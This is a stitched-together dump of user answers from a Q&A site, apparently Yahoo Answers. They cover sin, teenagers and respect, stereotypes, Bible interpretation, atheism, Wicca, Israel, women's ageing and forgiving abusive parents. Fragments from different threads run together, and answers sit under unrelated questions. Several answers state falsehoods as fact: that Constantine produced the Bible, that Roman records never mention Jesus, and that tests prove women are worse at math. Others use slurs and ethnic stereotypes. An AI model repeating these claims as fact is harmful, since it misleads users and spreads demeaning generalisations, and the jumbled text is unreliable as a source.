garden before she ate the apple.  It could have been 100 years.  But it did happen eventually.|`|ZJ2k7Ynqaa	Everyone sins every day, often without knowing it.|`|g4AAZRuxaa	Yes we do.|`|A9vvZ6eUaa	Yes, we all do.    Well, maybe not all.  Losasha never sins because she is Gods Soldier.|`|yQ6hRYdFaa	Everyone sinned since the beginning|`|xbw8P3Rsaa	No we do not.  Scripture shows infants do not sin.  Jesus was fully human and God and did not sin.  Humans who are retarded or comatose do not sin.  The early church was unanimous that Mary did not sin.        Humans now living in heaven do not sin.  Those in the womb do not sin.    "I mean Eve did condemn all her children to sin after she ate the apple right?"  -No.  Eve condemned her children to starting their lives with a deformed nature that draws them to want to sin, however one of her son, Jesus, never sinned.      Yes people can and will decide not to sin once they fully cooperate with the grace god has given us through the cross.      However, Mary, infants, kids, the retarded still need Jesus to save them by repairing the split between humanity and God and heal there natures (original sin).|`|55pSqrDcaa	its inevitable..its impossible not to sin because we live in a sin-filled world

bpsIfvyCaa	Disrespected by whom exactly? As a teacher for twenty years I would argue that teens have never had it so good and any `disrespect` is on their part, not society`s. To give one example out of countless of my own personal experiences and those of my friends and colleagues. Last March I covered a class of year 8s (12-13yr olds) for one period. During the lesson a 12 yr old girl took out her mobile phone and started to make a call in front of me. I said `Don`t even think about it, put it away`. Her response was  `You can`t do f*ckall. I`ll just say you felt me up an you`ll get fired`. I plucked the phone out of her hand and put it in my inside pocket. This 4`10" 12 yr old girl then jumped up and started punching a 6`1" professional teacher repeatedly on the chest shouting: `give me my f*cking phone you f*cking b*stard! who the f*ck do you think you f*cking are, give me my f*cking phone!` ad nauseum. A deputy head took her away eventually and another kid in the class told me `you had no right to take her phone, that`s dissing her!`    By `diss` I presume he meant the `disrespect` we nasty adults demonstrate to you poor downtrodden pubescents?|`|NAL9SZuXaa	due to stereotypes. Many people feel (and have experienced) a lot of disrespect teenagers from teenagers. It's like, what goes around comes around (sad truth).    Disrespect is something that you're going to have to deal with for the rest of your life (FYI), so you might as well learn how to deal with it, or learn how to defend yourself the right way.|`|432deb00cae326e960171b8b94849ceeaa	When I was younger I didn't get along with my dad.  We are both surgeon's and a few years ago I had to take over one of his operations because he had been drinking.  One of the nurses noticed that his hands were shaking and she called me in.  The patient died on the table and during the investigation I revealed the truth about what had happened.  He lost his license and went on a drinking binge in Australia.  A short time afterward he died of a heart attack.  I had to fly to Australia to claim the body, and on our return to Los Angeles, our plane crashed.|`|lrS8UXnYaa	Some are but not all.

The fact many choose to go into drugs, teen sex/pregnancy, etc. proves that point. This behavior instills a distrust in adults regarding teens, even if the teen is mature.     It's just something we have to deal with. Adults usually get over it if they see you can be mature and responsible.|`|U7sBZKUuaa	To be respected, you must first do something respectable.

Also, read a little of the bible near an open window, that also works for me. Oh!! And Get some Lavender and plant some around your front door. Lavender is said to have some powerful protection against evil spirits.    Hope this helps!!|`|TzodCxhgaa	The best tactic is to simply be brave and open-minded. Try to understand their situation. Why are they taunting you? Perhaps they are suffering, and this is their only means of getting your attention. Be sympathetic and tender. Smile, look into their eyes, and seduce them with your human kindness and intellect. In fact, you should speak to them. Ask them questions. If they don't answer, try to speak for them, try to guess what they want to say. There is a reason for everything. Don't be freaked out, "it's all in your head."
yDJiiqcsaa	Everyone has sinned.  Temptation can come from 3 sources.  1. The world - there are situations that exist in the world that look attractive and lure us to sin.  2. The devil/Satan - a real force of evil that actively tries to seduce/destroy us; 3. Our self - because of the fall of original sin - we have an inherent tendency toward evil.    Of these 3 sources  it is said that:  we can get away from the world (by avoiding places where temptations thrive);  we can pray that God will deliver us from the temptations of the devil; but we can never get away from ourselves.   As for "being consumed with guilt". There are 2 kinds of "guilt" - productive guilt that inspires us to turn away from sin; and non - productive guilt that keeps us mired in the mud of the past.   God is more powerful and forgiving than our sins/guilt deserve but it is true and to continue to "wallow in that guilt" is to somewhat disbelieve that God has forgiven us.  We can productively use memories of that guilt to steer us away from falling in that way again... but it is somewhat like standing and contemplating a manure pile to constantly concentrate on our sins/guilt of the past - it does no good and is very unpleasant.  It is better to embrace each new day with gratitude and ask God to send the grace to act in ways that will be pleasing to God today. (We aren't guaranteed tomorrow and we can't "do-over" yesterday) We only have today to shine or fall.  My prayers for you.|`|jdKOejikaa	ever since I got married. the mother inlaw just wont go away.....so yes      poster above me. gave me crabs. plz dont fall for the lies.

One more thing, though you like her, you both are ONLY 15, so don't invest too much money.    A bear and a poem will do just enough to let her know she is special to you.

62364eb8ec72973c388641049ba83389aa	Yes, when we see your American cartoons overseas, like the Simpson's or The Family Guy or King of the Hill and TV shows like Married with Children and Roseanne etc etc etc.     They all match exactly how we all stereotypically see all the American tourist visiting our countries, except for the hawaiian shirts and white socks and tennis shoes you all wear.    As being twilight zoned religious opinionated, moral, very loud, overweight and badly dressed. These cartoons even have it down to the way you all eat with one hand shovelling food in your mouths without chewing. That's how it's very easy to spot an American, no one eats food like them.    The part of  how Americans stereotype themselves we don't fully understand in all US TV shows. Is all American men are made to all look like beer swilling lazy dumb stupid fat idiots by American women.     While American women are made to look educated hard working and weaker gendered in all US shows and always a fifteen second hero if and when they speak out.     We don't never see that stereotypical side of Americans like it is very highly portrayed in all your cartoons, I mentioned and in US shows TV and US movies.|`|CkYaLp6Raa	Stereotypes are just generalizations, and all generalizations are false, so no.|`|gYegDDuBaa	asians eat rice. that is true and not racist. of course there may be some asians who dont eat rice but the majority do|`|WKH6t2MQaa	There is know such thing as a stereotype eg: Saying blonds are dumb is not true because there would be a lot of people with blond hair that are intelligent and it's the same sort of thing with all other things like that.|`|ugIf5TJKaa	some do that's how they got started to begin with|`|aa5f3f64fbc997444eed25e5c5ee915baa	Whether they are true or not, they end up determining your opinion of someone before you get to know them.

As long as it does not go expremes it should be fine. People with a chip on their shoulder or people with low self esteem, insecure are more likely to feel attacked by steretyping. Yes, there are stereotypes that are true, one of them is that women are not as good to math as men, when I first heard it I could not believe it because I am good at math, but tests have been made and it is true. Women that stated they are better at math than men took tests and prior to that they were told what the stereotype is and it turns out they performed worse.    About conservatives and religion, can`t say much, but if that is what you think you might have a reason.|`|D9GIH2nRaa	HAHA! yes! just yesterday in my public speaking class,(this is NOT to be racist), we had a mexican and an indian interview eachother in the front of the class. the mexican asked the indian what his parents did for a living.

Some, but very few, stereotypes are true.|`|2liwk8yKaa	I have no idea why someone would say that if you stereotype someone you are racist. They are two different words with two different meanings.It is like saying all mice eat cheese when in reality they eat all sorts of things|`|At7WLduQaa	thats why they are called stereotypes,  we might be different on the outside but we are all the same, no matter what anyone eles says|`|vNtgnag5aa	Well theres an acception to every stereotype.

I dont think its racist, I just think its close minded|`|XhpLwjCuaa	Most stereotypes are made to categorize specific groups of people because of things like clothing, speech, hairstyle, personality, etc. I think most people have individual personalities so although a person may seem to fit a stereotype it doesn't mean they will wear, say, act, etc like you think they will.|`|0KR4wyoQaa	I don't know ALL stereotypes, so I can't say if there are any that are true or not.

I don't think you really meant to ask if it would be racist to say these things.  Conservatism or Liberalism has little, if anything, to do with race.|`|LIJ8qnOVaa	I agree, and also agree that the majority of Conservatives are religious.|`|UmMxmmRMaa	Stereotypes are true for only some of the people who fall under them. That's why they're there, 'cause a lot of people who look a certain way or have a certain characteristic are often similar in other ways. But there are always a few who are different.      Take me, for example. I have long, blonde hair, blue eyes, and I'm built sort of athletic and thin but curvy. I usually wear my hair straight, I wear makeup and jewelry, and some of my clothes look pretty girlish. I've had the word "Barbie" shouted at me a few times, so let's not kid ourselves: most people probably see that and think I'm this shallow, stuck-up, unintelligent, easy, party girl type that does whatever everyone else does and whose best talent is maxing out someone else's credit cards at the mall. And they probably think I like the Jonas Brothers.    And while I don't feel like getting into an explanation of all the things I AM as opposed to the things I look like I might be, I can honestly tell you that I'm pretty much the complete opposite of the "Barbie" stereotype...seriously, it's a total and utter shock to some people. Also, just to put this out there, I seriously don't enjoy the Jonas Brothers' music and I don't find them any more attractive than most guys in my school. BUT I know that for a lot of girls who have the same sort of look as I do, the stereotype is pretty accurate; it wouldn't exist if it weren't.    I'm really tired for whatever reason so that might be a shitty answer, but I hope it was somehow what you were looking for.|`|U7sBZKUuaa	One thing that makes stereotypes seem real is the fact that people actually try to live up to them. I have seen a lot of people work hard to project the image that Hollywood made for them.

EBGdlo35aa	Well, MY question is this:  are the rules you mention really *significant* differences?    Personally, I feel that it should be interpreted as literally as possible (and sensible: for example, you don't take a symbolic prophetic dream literally).  But, the BOTTOM line is:  how does your belief affect your salvation?  If you believe that women are permitted to speak in church, will you lose your salvation if you are wrong?  Clearly, you will NOT.    SO, I think that any *reasonable* interpretation is in full agreement on the necessities for salvation.  In other words, the differences in *reasonable* interpretations are not going to affect anyone's salvation.    Jim, http://www.bible-reviews. com|`|wFlObEjcaa	the bible not all useless, it makes a great doorspot|`|aYY9dPVJaa	the Bible interprets itself|`|mM8HUQMzaa	Depends on the interpretation.

Anyone with an objective opinion would conclude that the bible is nowhere near being that.|`|0a35bd8efe64caf91fcf1e0cf5d79e07aa	The understanding of the living word of God is granted through the guidance if the Holy Spirit in accordance with what God determines our individual needs to be. That is why we are instructed not to argue over what the word means. If all of us would follow that simple instruction and measure ourselves by our own sticks, there would be no dissent nor divisions within the body of Christ. God bless.|`|QdAEKbveaa	Your mistaken in your assertions. Their are not many versions of what is right, their is only one and this is how it's been. The biblical laws, have existed as long as their have been written works, hence it's the first perfect moral law to exist. The Ten commandments are the foundations of morality, if you don't agree then that is your flawed adaptation to right and wrong.     If you allow the bible to interpret itself then you can say that you are safely following it's teachings. As soon as anyone interprets things without other biblical citations as reference points they are deviating for the truth which Gods words contain and reaffirm within itself,|`|AA10815904	My Bible is not open to interpretation. What others believe is their business, not mine.|`|AKFlMCToaa	Friend,    The Bible is not open to individual interpretation.    (2 Pet 1:20)  20Knowing this first, that no prophecy of the scripture is of any private interpretation.     21For the prophecy came not in old time by the will of man: but holy men of God spake as they were moved by the Holy Ghost.    The Bible says also that there is only one belief system that will lead people to salvation:    Eph 4:1  I therefore, the prisoner of the Lord, beseech you that ye walk worthy of the vocation wherewith ye are called,     2  With all lowliness and meekness, with longsuffering, forbearing one another in love;     3   Endeavouring to keep the unity of the Spirit in the bond of peace.     4  There is one body, and one Spirit, even as ye are called in one hope of your calling;     5  One Lord, one faith, one baptism,     6  One God and Father of all, who is above all, and through all, and in you all.     Good luck.|`|OuvATYw3aa	Though we deviate or create our own path, if we throw out the Bible then there is no purpose in living.

SzqCD0G0aa	"So atheists believe in nothing? that would mean you were created from nothing, so that means that you mean nothing (no purpose)? So if you mean nothing and were created from nothing, what are you? nothing???"    Firstly - Look up Nihilism. A nihilist is one who believes in nothing.     "We are made for a different purpose.. why were we made so superior over all other animal kingdoms?"    Step outside of urban america and go on a safari, with just your wit, intellect and bare hands.  If you survive out there with nothing then you can claim you are superior.    "And for all the evolutionists out there.."    There is no such thing as a evolutionist, look it up.      "How is it that humans are the only superior species, and animals have not have the ability to reach the point at which we have become..?"  Name one animal that is vunerable while expelling it's body of urine or feces. Then imagine yourself reacting to threat the same way as an animal when in the same predicament.  There are a few things that animals are far superior to us in, which includes not screwing each other over for profit and greed.    "Surely if evolution was true, there would be other species as advanced as ourselves."  You think too much into mans intellect.  If not for technology and weapons, man would be screwed.|`|aBHY2iXraa	Your initial assumption is false...    Rewrite the question and repost.|`|HIskrREJaa	ummm alrighty then. you are in need of some science classes...   so in your version of evolution (if it were true in your eyes) there are dogs and fish walking around and talking and praying to god like you do?|`|3ibsZ4mTaa	Nihilists lack belief in everything.

You should be embarrassed to be so backward in this day and age.|`|87CAVhs2aa	Oh, boo. Stop trying to make us feel like our logic is stupid.  We DO believe in things we see, feel, touch, research. We were not created from nothing. Actually, we evolved over MILLIONS of years from the tiniest particles.  Not believable? Yes, well, one man-super-god-thing created the world in seven days by itself? AND THEN you mean to tell me that "it" created a man from the dirt, and created a women from the rib? Yes, yes, makes much more sense. -_-  Organisms evolve differently. When we evolved from the apes and all, they already had abilities like walking on 2 legs and opposable thumbs. Creatures such as... fish. They had the fins and the gills to breath underwater. You see, just because we are dominant does not mean we were created for a purpose. We were able to adapt better to wordly conditions and use our abilities to work.    Is everyone happy now?

That's pretty successful.     Not to mention, your understanding of evolution is completely flawed.  There is no direction, only an indirect desire to pass on your genes.|`|AA10503170	There are advanced species.  Monkeys, chimps and apes are advanced.

Look what we have done to this earth in the short period of time we've been here.  Your god must be an f'ing lunatic if he created the humans to oversee this planet.      We are not a superior species.  We just happen to have a frontal lobe that allows us to reason and think on a different level.      And, I do believe in something.

"why were we made so superior over all other animal kingdoms?"    we have more developed brains and are capable of abstract thought.  that coupled with oposable thumbs help quite a bit.    "How is it that humans are the only superior species"    i would argue that.  if thrown into another environment we would fair poorly.  cockroaches on the other hand are capable of surviving in the hardiest of environments and bacteria can survive in places no other life dare touch.  i would ask what your definition of "superior" is.  if it is the ability to adapt to our environment then we kind of suck at it.    btw, we are not the only animals to exibit problem solving skills, tools, memory, society, communication (chimps practicing sign language, whales singing...)|`|280f28d4a4bdbac672e999c6f13ee657aa	It means you like straw man arguements|`|fOKssTulaa	I was going to answer this, but wanted to see if I was right.  I was.    They answered exactly as I knew they would.    So predictable, why bother?|`|Zj8JkvX1aa	No. Nothing.  You aren't saying anything.|`|pbqgHOX9aa	So atheists believe in nothing?    THAT IS NOT TRUE, WE BELIEVE IN OURSELVES AND HUMANITY IN GENERAL.  IT WILL BE HUMAN KINDNESS THAT MAKES THE WORLD GO ROUND AND RELIEGOUS WARS THAT TEAR IT DOWN.    that would mean you were created from nothing,   ACUTALLY, I WAS CREATED FROM EXACTLY THE SAME MATERIAL AS YOU, BY TWO PARENTS.  (MINE WERE NOT RELATED).    so that means that you mean nothing (no purpose)?   MY LIFE, MY CHILDREN, & MY PERSONAL SUCCESS DISPUTE THAT THEORY.    So if you mean nothing and were created from nothing, what are you?  nothing???    WELL YOU'RE WRONG ON THE FIRST TWO (mean nothing and were created from nothing)    SO YOU MUST BE WRONG AGAIN ON THE LAST. (nothing???)    We are made for a different purpose.. why were we made so superior over all other animal kingdoms?    WE ARE NOT SUPERIOR WE ARE MORE AMBITIOUS, SCANDALOUS, AND RECKLESS.  REMEMBER, IN A  NUCULAR HOLOCOST, WE WILL BE THE FIRST TO GO.    And for all the evolutionists out there..  How is it that humans are the only superior species, and animals have not had the ability to reach the point at which we have become..?  CAN YOU FLY ON YOUR OWN? CAN YOU STAND MUCH OF ANYTHING WITHOUT MANUFACTURED MATERIALS?  COULD YOU SURVIVE WITHOUT ELECTRIC, PHONES, STORES, OR SECURITY?    HOW ABOUT STEPPING INTO A PIT WITH A WILD LION, , BARE NAKED, BARE HANDED & SMELLING LIKE A STEAK WE WILL SEE WHO IS SUPERIOR.    Surely if evolution was true, there would be other species as advanced as ourselves..   ANIMALS AND PLANTS ARE THE BEST AT SURVIVING IN THEIR OWN ENVIROMENT.  MAN CAN BE NUREOTIC, ADDICTIVE, AND JUST PLAIN IDIOTS.  ANIMALS DON'T BELIEVE IN A BETTER PLACE WHEN THEY DIE.  FLORA AND FAUNA'S ONLY PURPOSE ARE TO CREATE THE NEXT GENERATION.

vquwiGegaa	Chinese Taoists believe Lao Tzu had achieved immortality, and he was few hundred years older than Buddha, and according to one of the Taoist's Jing (Sutra) that Lao Tzu went west after he achieved the Taoist Enlightenment.    When he reached the farther end of Chinese border going toward India, he left behind one of the most famous of Taoist's Jing (Sutra) - the famous "Dao De Jing" to one of the gate keepers of outer boundary of China, it was told that he told the gate keepers that he was going West to give salvation to the Barbarians there, and he was never heard from again.     So some claimed he went to teach the Buddha what he had learned of the truth of the Universe.    The aftermath of the story, the gate keeper who got the Dao De Jing and practiced base on the teaching, supposedly he too achieved immortality?
TtPoXArjaa	Romaji: kore miyogashi Maiku wa, mochiron kazari de gozaimasu.    English:  "Kore miyogashi" means "razzle-dazzle," "Maiku wa" marks Mike as the subject of the sentence, and "mochiron kazari de gozaimasu" means "[they are/he is/it is] of course decorations."    I'm not quite advanced enough to know if some of this is an inverted sentence (used in casual speech), which could lead to a few different translations.  "Mike" could also be "microphone" which adds a few more.    My best guesses:    "Mike is razzle-dazzle, so of course they are decorations."  "The razzle-dazzle microphone is of course a decoration."|`|wrdPBLq0aa	Mike-sounding, are of course decorations.     Mike pare, sunt, desigur, decoratiuni.

n1eXQr5oaa	me no know what you speaking of|`|BKTx9IsZaa	http://snipurl.com/b1c0l|`|5ljN0M2Caa	Concerning the answer to life, there is only One truth. The Lord Jesus Christ is that Truth. We can know it is the truth for a certain. God has given to us His Word and we must believe in this. God commands everyone, everywhere, to repent and believe in the Lord Jesus Christ.   The day we die,( and we all know this as a truth), we will stand before a Holy God who will judge us, whether we embraced His Son the Lord Jesus Christ in this life or not.( Matthew 7verse 2.) If we did, He will welcome us into Heaven, if we didn't,  He will  throw all the unsaved people into Hell. This is the Truth. Now, people can do all they want to try and make this a lie and pretend it will not happen, but it Will happen.. Seek the Lord today, whilst there is breath and life in your body. Read Luke 9 verse 25 ' For what is a man advantaged, if he gain the whole world,and lose himself, or be cast away'. I tell people to read the Holy Bible. Read today what God has to say to you. Act today and be saved. To embrace the Lord Jesus Christ, you must ask Him to forgive you of all your sins. Do you believe yourself to be a sinner? Only the Lord can forgive. He is God.|`|wFlObEjcaa	no...there? u might? no there isnt?|`|buiHdl0Gaa	Is  yr name Hamlet ?|`|nIu8zVkXaa	There is only one truth.  That truth is that God is in Heaven and the earth is His footstool.  Jesus Christ is His Son and the Light of the World.  No man comes unto the Father except by Him and at the end of the age, every knee will bow and ever mouth will confess that He is Lord and He will put His enemies under His foot.

There is not one single mention of Jesus in the entire Roman record - that is right - not one!!! At the same time as he was supposed to have been around there were a number of Jews claiming to be the messiah - all of whom are well recorded!!    He was supposed to have been a huge problem to the Romans and produced wonderful miracles but still not one contemporary record?    Even the bible mentions of him like all other references were not written until many years after his supposed death!!    At best he was an amalgam of those others!!    Pilot is recorded in the Roman record as a somewhat lack luster man but no mention of a Jesus, a trial or crucifixion that would surely have been used to make him look brighter!!      The Roman Emperor Constantine produced the bible and he was a pagan not god!!!   He also organized Christianity into the Holly Roman Catholic Church!!  Not in Israel or any of the countries of supposed origin but entirely Italian!!    Not one word of it is contemporary with the period and was not written until many years after the period the story is set in!!    What a wonder full disinformation and deception campaign he waged against his Christian enemies - so good in fact that Christians are still following the deception to this day!!!|`|EtMW3RY0aa	"not really.

The GLC issued a document in the 80s saying `only men can be sexist and only white people can be racist`.

jnnIwdtyaa	Merry Meet,    I see this allot these days. Many people come to Wicca because they heard about it and like one or two of the practices or possibly just want to upset their family. If you really wish to practice Wicca you must first understand that we dont have a central leadership. Also, though there are many Traditions in Wicca, including Eclectic Wicca, we follow some basic precepts.     01. Wicca is an oath-bound mystery religion, each Wiccan should either be Dedicated or Initiated as a Wiccan to be considered a Wiccan by their peers and/or the general Wiccan community.   02.  Wiccans are polytheistic, honoring a variety of gods and goddesses.  03.  Wiccans are also dualistic, seeing individual deities, at least to some extent, as aspects of one God and one Goddess.  04. Wiccans are also pantheistic do some degree or another, viewing divinity as immanent within the natural world.  05. Wicca encompasses the practice of magick even though many Wiccans dont practice magick.  06. Wiccans show religious devotion to the Goddess and/or God (depending upon Tradition).   07. Wiccas ethical basis is expressed in the Wiccan Rede ("An it harm none, do as ye will"), and the Threefold Law ("What ye send returns three times over").  08. Wiccan Ritual usually involves casting a circle as the basic setting for spiritual and magical work, as well as emphasizes the Platonic four elements of earth, air, fire and water and some form of gender polarity, be that theologically in the image of the God and Goddess, and/or mundanely in the physical gender of participants as well.  09. Wiccans more often than not incorporate some form of the "Great Rite" (union of the God and Goddess), frequently symbolized in the blessing of the ritual wine by the conjoining of the athame (ritual knife) and chalice (ritual wine cup).    Now if you are still interested about learning Wicca here are many legitimate sources out there today to glean knowledge from. One being Witchvox at http://www.witchvox.com/. You could look into getting online training through the Sacred Mists at http://www.workingwitches.com/wicca/cour... or OZ Wicca at http://www.ozwicca.com/ , both are pretty decent for learning the Craft on the Web. Ultimately, study, study and then study some more. Find all you can and definitely cross reference whenever possible, this way you can get the best out of all you learn.    I also suggest that you get your hands on Wicca for Beginners by Thea Sabin and/or The Circle Within by Dianne Sylvan. Both of these books are very good reading and both will give you some deeper insight to the Craft and how it relates to you. I hope that this little blurp has helped you out some.    Blessed Be    Nyjh|`|7mhRDbvsaa	read a lot of harry potter, twilight and be a criss angle fan|`|Tvc6Tmz5aa	I would suggest Wicca: A Guide For The Solitary Practitioner by Scott Cunningham as a sort of primer.

Also get knowledge of all Religions, but also some scientific theory as well (e.g biology, botany etc esp. of your local environment). Spend time in the natural environment, be open minded, be happy.    Learn to see the beauty of every situation,  and realise how powerful a tool the human mind really is.    ED: the book recomended by the guy below me is one of the best introductory books written on the subject, get your local book store to order it for you. And smoking weed is entirely optional lol

GHdscZ2Haa	was walking across a bridge one day, and I saw a man standing on the edge, about to jump off. So I ran over and said "Stop! don't do it!"   "Why shouldn't I?" he said.   I said, "Well, there's so much to live for!"   He said, "Like what?"   I said, "Well...are you religious or atheist?"   He said, "Religious." I   said, "Me too! Are you christian or buddhist?"   He said, "Christian."   I said, "Me too! Are you catholic or protestant?"   He said, "Protestant." I   said, "Me too! Are you episcopalian or baptist?"   He said, "Baptist!"   I said,"Wow! Me too! Are you baptist church of god or baptist church of the lord?"   He said, "Baptist church of god!"   I said, "Me too! Are you original baptist church of god, or are you reformed baptist church of god?"   He said,"Reformed Baptist church of god!"   I said, "Me too! Are you reformed baptist church of god, reformation of 1879, or reformed baptist church of god, reformation of 1915?"   He said, "Reformed baptist church of god, reformation of 1915!"     I said, "Die, heretic scum", and pushed him off.       -- Emo Phillips|`|lEPGcFqFaa	Ever see an atheist's frustration when someone sneezes in front of them and they are trying to figure out what to say?

It is not taught in Islam to kill Jews nor Muslims.  Stupid little terrorist are spreading the hate killing the innocence.  Israel is the land for Jews. But the government itself is not controlled by Jewish people - Just like the American government is not controlled by Christians. The Government and media are corrupt! Show proof from the Qur'an... I have the Qur'an right here to prove you wrong. If you read the Qur'an than you would read that prophet Muhammad had many Jewish friends. In a sense Israel should not exist because in the Torah (holy book for Jews) Moses says that Jews are to be exile and live amongst the world never to have one land just for them. Reason why God sent that message for Moses to preach was because when people are exile amongst the world; they are in a sense forced to get along with the people around them as brothers and sisters no matter what religion or race. That's why the Jews that follow that Judaic law choose to live in Iran, Iraq, Yemen, Egypt and all over the world.|`|7UV3OVANaa	the quran says that Palestine was given to his believers. Israelis were believers, but disbelieved, that's why it was taken away from them, and it was given to MUSLIMS who believe in ALLAH and the QURAN|`|i1t6vxe5aa	In support of the Palestinian Muslimah,   yes, God had chosen them above the rest of creation, but they did wrong by disobeying Him, I think you can find that in the bible too.  They were to follow the new prophet that God sent after Moses, who was Jesus and we all know that didn't work out, and so the people of Moses (the Jews) and the people of Jesus ( The Christians)  were all supposed to await then follow the new prophet that God sent. SO  yes, the land does belong to the believers, and they are no longer believers.    I hope u understand.
bo2dXIq8aa	He whines because you do not have time to devote all your attention to him. It may be at one point he was the center of your attention and since he is no longer that, he may be whining to get attention.

FpT7x2VVaa	since the question clearly was for the ladies here, I will not attempt to answer (although I'm tempted), but I will give you a little hint, which will help you decide without asking a woman's age: there are two areas you can look for and determine a woman's age pretty accurately, if you so wish, and they are: the neck and the hands.     now, necks can be 'corrected' through surgery, but it's rare  -  they are usually just covered by a shawl, throw or suitable pullover ( and these are then a give-away), and hands, well, you can't very well hide them all the time.  so when you have a face smooth like a baby's behind and the hands don't agree, you have your answer.    I do agree with those who wish to age gracefully - much more important IMHO.|`|3OL7vVLuaa	Well, there's a ton of pressure on women to look a certain way. WAY more pressure on women than on men. Look at the news.... if some of the women looked as messed as the men, they'd never be hired! So you can't blame women for doing what they do -- it's a youth driven, appearance driven society -- shouldn't be -- but it is.|`|VsamHLPOaa	Well I don't agree with anyone lying about their age but as far as plastic surgery go maybe its something they are doing for themselves. To make them feel better, doesn't necessarily mean they want attention or be objectified. Right now I'm young so I'm not sure where I stand on the whole plastic surgery thing right now but if I get older and I choose to get plastic surgery than its something I'm doing for me. I will not however be trying to look 20 and my 40 or 50's. I know that that is impossible and just plain ridiculous.|`|WW1xWP8gaa	i will never get plastic surgery because it shows who i am i don't want to look 20 forever i want to grow up some time|`|MPtt9wPjaa	yea the women who DO such things have it coming, i agree. Same goes for the girls who dress or behave in a manner where they like the attention. It boggles my mind too how those women end p getting the idea that they have a right to complain.  but i also understand that it's hard for women to face aging because they've had to keep a certain image for so long, and their appearance is given importance for so long that when theyre finally older and not alot of people care what they look like, it's hard to grasp.    so yea the girls dont have a right to complain, but under no circumstances does it make it right for a guy to objectify women, period. so i guess both the genders are in the wrong|`|b2276382725a0bce8479b4c02cdb38b3aa	Just because someone wants look young doesn't mean should be objectified. I don't see how they go hand in hand. I mean imo opinion i think women go to such extreme legths to change themselves because men (well, imo society as a whole) objectiifies them.     Personally i have no problem telling people my age, but i'm 20. But it really is no one's business what people do to them selves to enhance their selves. I don't care about it. And yes some people actually just age better than others. Like my mom  looks 25ish no where  near her real age. She hasn't had surgery and the only thing she uses is mineral makeup.    Me personally, when i get older, i will not get suregery to make me look younger. I will accept it and move on. Aging is natural i will be happy with however i look because i will know that its really whats on the inside that really counts.|`|tmFEFBQKaa	I respect women who age gracefully.  And maybe if the media didn't glorify 19 year old skanks, older women wouldn't be so self-conscious.|`|UspK4SQBaa	That's not objectification.  It's just being nosy, and most women don't lie about their age or surgically alter their looks.|`|CEChcfKwaa	Dude you watch too much tv. The average woman doesn't waste her money on face lifts and botox. Do you think we're all rich, bored hollywood housewives? Get a grip.     By the way, it has always been rude to ask women their age, long before face lifts and dermabrasion. In fact if anything it's less taboo now than it used to be.    Edit  Well what do you think about men who get hair implants and face lifts and use Viagra? You act as if only women try to stay young. Why can't men accept their bald heads, wrinkled faces and limp tools? When you're old, bald, impotent and happy about it, then you can pass judgement.|`|da4zS4AOaa	I really don't understand how those women get away with lying.

(if you are a woman)    Hope it works for you!
yDJiiqcsaa	And so the thrust of this is that you aren't a Christian anymore because God didn't prevent your parents from abusing you ?   When was the last time that you wanted to exceed the speed limit and God didn't "permit you" to do it ? The last time you wanted to pilfer pens/notepads from your office and God didn't permit it ?  People want free will when it is them choosing to abuse it.   God doesn't only permit free will when we choose to use it for good.  That's how this world works - we have free will to choose what kind of world we will make/tolerate.  God didn't force your father to hit/call you names - that was his choice to act like a jerk.  There's a difference between "love" and "like" . We are called on to "love" even our enemies. Love meaning to want what is best for them. Sometimes wanting what's best for a person is that they will get caught and have an opportunity to grow as a consequence of court/imprisonment.  Does that person deserve your respect ?  We respect the position of authority because they have been placed in authority over us - but we can't respect/like unjust behavior.  Withholding forgiveness is like carrying a sharp knife in your pocket (without a sheath) - as we move through life that blade will move and cut us and injure us.  If we choose to forgive because God wants that - then we are opening the door for God to heal us and stop that knife from incessantly cutting us.  God will exact justice for us when we surrender control to Him.  As long as we maintain control - the knife rubs us raw, makes us angry and bitter and taints our life.  Am I saying it's easy to forgive? No ! I hate forgiving - but I know from experience that when I finally choose/decide to forgive - that even though I'm still hurting and still angry that it starts the process for God to heal me and deal with "him/her".  As for your grandparents  expecting you to love - it is VERY difficult to forgive/love especially if the person's have never admitted guilt, asked forgiveness or tried to make amends.  They may be asking more of you than you can give - but if you invite God into the process - God can give you peace and infuse you with His love when you have none of your own to spare for them. Forgiveness is a decision. Forgiveness is not the absence of anger or pain in your heart.  You give the decision to allow God to take both the pain/anger AND allow God to give you healing/love for you and empathy for them.   I'm sorry you are hurting.  Throw it down when it gets too heavy to carry - if not for them - for your sake.  I can't say what I want to say well but I know this is true.  If you have a chance rent the movie, "Pay it forward" and watch when Helen Hunt goes to see her mother in the train yard - that explains it better than I can.  I'm sorry that you are hurting.|`|FMuSs9Qtaa	Children don't have to love their parents, but they have to respect them|`|d938becd9c20c43cfbbbca1473443b4aaa	there should be a respect issue there but you do have to earn it...if they fail then they do not deserve your love|`|Yz8Ysagiaa	Yes a child must love his/her parents 2nd only to God.|`|XEBpv9gwaa	The commandment to honor ones mother and father means to have respect for authority.  It does not force a relationship where it is unsafe for an individual emotionally or physically.  However, we are to forgive those who have hurt us, and we are to love our neighbors as ourselves - which includes people we may have a hard time feeling positively toward.|`|AA10192697	THe commandment isn't "Thou shall love your parents", it's "thy shall honor thy mother and father."    Honoring and loving are 2 different things.    I think in order for one to love their parents, abusive ones, they first need to forgive them, then they can love them again.  And God does instruct us to forgive others.  Forgiveness is good for you to clean your heart and soul once again. But at times it can be hard to do.  Counseling with a priest or spiritual director can sometimes help.    Honoring your parents means to respect authority figures, helping elderly, etc.  You can do this without love but you can do it better with love in your heart.    I personally think that  you can really, really dislike an abusive parent yet still have love for them.  Having love for them makes you a better person because you want them to change, to become a better person. And this is when forgiveness comes into play.|`|Lc5FtItDaa	As someone who teaches kids who have been abused and neglected, I have observed that kids are biologically programmed to love their parents and seek their approval, even when their parents are total head cases, especially when their parents are total head cases.  It is the parent's who spoil them whose kids end up hating/beating/emotionally terrorizing them.    However I suspect you are asking if YOU are obligated to love your parents.  The answer is no.  Love can not be an obligation without changing the definition of love.    As far as respect, that is different from love.      Whether they deserve it is not the question.  Possibly, in 17 years, your kid may tell his/her friends that you don't deserve respect because of the way you treated his/her grandparents and kept him/her from a relationship with them.  Thus respect and disrespect are cyclic.  Believe me, if you harbor bitterness for your parents and let it poison your adult life, it will poison you children.  Not might.  Not maybe.  It will.  They will learn that bitterness is a valid way to handle disappointment, that love is conditional, and, let's face it, that Mom is a b_______.    You have an obligation to respect people just because they are people.  There are two kinds of respect: intrinstic and extrinsic.  I is respect you really feel and give willingly.  E is respect for the office or postition.  I you give your mentors and heros.  E you give teachers, police, and your parents.  This just saves some trouble.  Some intrinsic respect is owed to everyone.  You don't get in someone's face in the street and yell and curse.  You say 'please' and 'thank 